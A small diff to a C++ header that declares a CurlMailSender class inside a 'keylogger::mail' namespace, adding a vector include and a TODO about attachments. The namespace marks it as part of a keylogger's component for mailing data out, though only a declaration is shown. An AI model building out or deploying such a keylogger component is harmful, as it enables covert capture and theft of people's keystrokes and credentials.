@@ -1,12 +1,14 @@
 #pragma once
 
 #include "MailSender.h"
+#include <vector>
 
 namespace keylogger::mail
 {
 class CurlMailSender : public MailSender
 {
 public:
+    // TODO: add attachment handling
     bool sendMail(const Mail&, const Credentials&) override;
 
 private:
